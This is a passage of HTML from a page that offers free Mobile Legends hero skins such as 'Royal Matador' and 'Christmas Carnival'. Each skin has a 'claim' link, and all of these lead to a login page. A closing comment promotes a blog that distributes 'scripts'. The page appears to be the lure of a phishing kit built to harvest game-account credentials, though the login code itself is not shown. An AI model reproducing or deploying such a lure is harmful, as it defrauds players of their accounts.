				<img src="https://s7d1.turboimg.net/t1/38731434_7126162.png" alt="" />
				<div class="movieinfo">
					<h3>FANNY</h3>
					<p>Punk Princess</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    		    	
	    	    	
	    	
	   
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731435_8535147.png" alt="" />
				<div class="movieinfo">
					<h3>CLINT</h3>
					<p>Guns And Roses</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731436_7588085.png" alt="" />
				<div class="movieinfo">
					<h3>NANA</h3>
					<p>Slumber Party</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731437_3953143.png" alt="" />
				<div class="movieinfo">
					<h3>LAYLA</h3>
					<p>Cannon And Roses</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731453_8144856.png" alt="" />
				<div class="movieinfo">
					<h3>LASLEY</h3>
					<p>Royan Musketeer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731455_3551974.png" alt="" />
				<div class="movieinfo">
					<h3>LANCELOT</h3>
					<p>Royal Matador</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731454_8544155.png" alt="" />
				<div class="movieinfo">
					<h3>HARLEY</h3>
					<p>Royal Megister</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731456_6949279.png" alt="" />
				<div class="movieinfo">
					<h3>BRUNO</h3>
					<p>Best Dj</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731457_7721511.png" alt="" />
				<div class="movieinfo">
					<h3>SUN</h3>
					<p>Rock Star</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731458_1920349.png" alt="" />
				<div class="movieinfo">
					<h3>CLINT</h3>
					<p>Rock And Roll</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731459_1294068.png" alt="" />
				<div class="movieinfo">
					<h3>BALMOD</h3>
					<p>Savage Hunter</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731460_3005741.png" alt="" />
				<div class="movieinfo">
					<h3>HYLOS</h3>
					<p>Abyssal Shaman</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731461_6370312.png" alt="" />
				<div class="movieinfo">
					<h3>TIGREAL</h3>
					<p>Fallen Guard</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731466_5755873.png" alt="" />
				<div class="movieinfo">
					<h3>ODETTE</h3>
					<p>Christmas Carnival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731475_5115222.png" alt="" />
				<div class="movieinfo">
					<h3>LANCELOT</h3>
					<p>Christmas Carnival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731476_5609234.png" alt="" />
				<div class="movieinfo">
					<h3>RUBY</h3>
					<p>Hidden Orchid Butterfly</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731477_1725774.png" alt="" />
				<div class="movieinfo">
					<h3>LAPU-LAPU</h3>
					<p>Imperial Champion</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731478_8670560.png" alt="" />
				<div class="movieinfo">
					<h3>Aurora</h3>
					<p>Foxy Lady</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731480_8101868.png" alt="" />
				<div class="movieinfo">
					<h3>NATALIA</h3>
					<p>Phantom Dancer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731481_1997878.png" alt="" />
				<div class="movieinfo">
					<h3>ARGUS</h3>
					<p>Dark Draconic</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731483_7190532.png" alt="" />
				<div class="movieinfo">
					<h3>ODETTE</h3>
					<p>Mermaid Princess</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731484_7175002.png" alt="" />
				<div class="movieinfo">
					<h3>IRITHEL</h3>
					<p>Nightarrow</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731558_6001572.png" alt="" />
				<div class="movieinfo">
					<h3>KARRIE</h3>
					<p>Bladed Mantis</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731559_2435147.png" alt="" />
				<div class="movieinfo">
					<h3>LOLITA</h3>
					<p>Impish Trickster</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731560_8717762.png" alt="" />
				<div class="movieinfo">
					<h3>ALICE</h3>
					<p>Spirit Woman</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731561_1436280.png" alt="" />
				<div class="movieinfo">
					<h3>LESLEY</h3>
					<p>Black Rose Admiral</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731562_5497857.png" alt="" />
				<div class="movieinfo">
					<h3>ROGER</h3>
					<p>Anubis</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731563_8870755.png" alt="" />
				<div class="movieinfo">
					<h3>CYCLOPS</h3>
					<p>Super Adventure</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731564_1584440.png" alt="" />
				<div class="movieinfo">
					<h3>AKAI</h3>
					<p>Monk</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731565_6272848.png" alt="" />
				<div class="movieinfo">
					<h3>FRANCO</h3>
					<p>Masterchef</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731566_8936737.png" alt="" />
				<div class="movieinfo">
					<h3>MINITOUR</h3>
					<p>Taurus</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731567_8147426.png" alt="" />
				<div class="movieinfo">
					<h3>MOSKOV</h3>
					<p>Snake Eye Commender</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731568_3523843.png" alt="" />
				<div class="movieinfo">
					<h3>YING SUN SIN</h3>
					<p>Apocalypse Agent</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731569_3662376.png" alt="" />
				<div class="movieinfo">
					<h3>YING SUN SIN</h3>
					<p>Roguish Ranger</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731570_2824303.png" alt="" />
				<div class="movieinfo">
					<h3>CHOU</h3>
					<p>King Of The Fighter</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731571_2032947.png" alt="" />
				<div class="movieinfo">
					<h3>KAGURA</h3>
					<p>Cherry Witch</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731572_1998847.png" alt="" />
				<div class="movieinfo">
					<h3>HAYABUSA</h3>
					<p>Future Enforcer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731573_6619805.png" alt="" />
				<div class="movieinfo">
					<h3>RAFAELA</h3>
					<p>Flower Fairy</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731574_12.png" alt="" />
				<div class="movieinfo">
					<h3>ESTES</h3>
					<p>Galaxy Dominator</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731575_824491.png" alt="" />
				<div class="movieinfo">
					<h3>RAFAELA</h3>
					<p>Biomedic</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
			    
	   
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731576_5685269.png" alt="" />
				<div class="movieinfo">
					<h3>VEXANA</h3>
					<p>Sanguine Rose</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731577_5643058.png" alt="" />
				<div class="movieinfo">
					<h3>FRANCO</h3>
					<p>Apocalypse</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731578_3934951.png" alt="" />
				<div class="movieinfo">
					<h3>SABER</h3>
					<p>Fullmetal Ronin</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
			    
	   
			<li>
				<img src="https://s7d1.turboimg.net/t1/38644797_11.png" alt="" />
				<div class="movieinfo">
					<h3>ALPHA</h3>
					<p>Onimusha Commander</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38644827_10.png" alt="" />
				<div class="movieinfo">
					<h3>CHOU</h3>
					<p>Dragon Boy</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38644834_5638945.png" alt="" />
				<div class="movieinfo">
					<h3>ALICE</h3>
					<p>Wizardry Teacher</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
		<ul id="movieposters">
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735974_9580481.png" alt="" />
				<div class="movieinfo">
					<h3>GATOT KACA</h3>
					<p>Arhat King</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38799473_9125329.png" alt="" />
				<div class="movieinfo">
					<h3>KARINA</h3>
					<p>Christmas Carnival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735976_1849664.png" alt="" />
				<div class="movieinfo">
					<h3>Pharsa</h3>
					<p>Peafowl Pharsa</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
		<ul id="movieposters">
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735977_4231300.png" alt="" />
				<div class="movieinfo">
					<h3>ARGUS</h3>
					<p>Catastrophe</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735978_9398243.png" alt="" />
				<div class="movieinfo">
					<h3>LAYLA</h3>
					<p>Bunny Babe</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735984_8341259.png" alt="" />
				<div class="movieinfo">
					<h3>ROGER</h3>
					<p>DR. Beast</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>
		<ul id="movieposters">
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735985_3966445.png" alt="" />
				<div class="movieinfo">
					<h3>FANNY</h3>
					<p>Campus Youth</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735986_605298.png" alt="" />
				<div class="movieinfo">
					<h3>BANE</h3>
					<p>Count Dracula</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735983_8731690.png" alt="" />
				<div class="movieinfo">
					<h3>KARINA</h3>
					<p>Spider Lily</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>
	<ul id="movieposters">
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735987_2011317.png" alt="" />
				<div class="movieinfo">
					<h3>GORD</h3>
					<p>Christmas Carnival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735988_7928199.png" alt="" />
				<div class="movieinfo">
					<h3>MIYA</h3>
					<p>Honor</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735979_4655834.png" alt="" />
				<div class="movieinfo">
					<h3>MARTIS</h3>
					<p>Tyrant</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
		</ul>
</body>
</html>